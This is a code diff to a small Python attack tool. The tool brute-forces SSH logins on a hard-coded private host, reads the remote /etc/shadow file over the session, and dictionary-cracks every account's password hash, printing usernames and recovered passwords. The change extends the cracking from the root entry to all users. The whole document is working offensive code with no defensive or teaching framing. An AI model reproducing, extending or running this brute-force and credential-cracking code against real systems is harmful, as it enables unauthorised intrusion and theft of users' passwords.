@@ -4,7 +4,7 @@ __author__="riverchu"
 
 import optparse
 
-from scan import *
+from scan import resolveIP
 from brute import bruteSSH,loginSSH,bruteUnixPasswd
 
 def brute(host,user,dictionary,*,connections):
@@ -25,12 +25,17 @@ def scan():
     pass
 
 def main(host,user,dictionary,*,connections=10):
+    for i in resolveIP.resolveIP('10.108.36.71'):
+        pass
     info = brute(host,user,dictionary,connections=connections)
+    if not info['key']:return
     handle = login(info)
-    ret = loginSSH.send_command(handle,'cat /etc/shadow|grep root')
-    passwdInfo = bruteUnixPasswd.crack_unix_passwd(ret,dic='./data/dictionary.txt')
-    print('user:',passwdInfo[0])
-    print('password:',passwdInfo[1])
+    if handle:
+        ret = loginSSH.send_command(handle,'cat /etc/shadow')
+        t = ret.split('\n')
+        for line in ret.split('\n')[:-1]:
+            passwdInfo = bruteUnixPasswd.crack_unix_passwd(line,dic='./data/dictionary.txt')
+            print('user:',passwdInfo[0],'\tpassword:',passwdInfo[1])
 
 if __name__=="__main__":
     host = '10.108.36.71'
